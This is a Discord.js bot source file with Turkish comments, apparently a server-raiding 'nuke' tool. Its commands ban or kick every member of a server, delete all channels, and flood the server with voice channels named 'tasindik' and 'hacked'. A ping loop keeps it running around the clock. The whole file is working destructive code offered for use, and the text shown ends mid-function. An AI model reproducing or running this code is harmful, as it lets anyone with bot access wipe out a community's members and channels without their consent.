const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const http = require("http");
const express = require("express");
const request = require("request");

const app = express();
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAGLAYAN KOMUT
}, 280000);

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+çökert") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP tasindik ADINDA COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //// SAYFANIN EN AŞAGISINDA DIĞER KOMUTLAR VAR ININ

    await msg.guild.createChannel("gg", {      //gg YAZAN YERI DEGISTIRMEYIN SAKIN
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })                                //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })                              //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {        //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {       //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ hacked", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ enes", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ acar", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
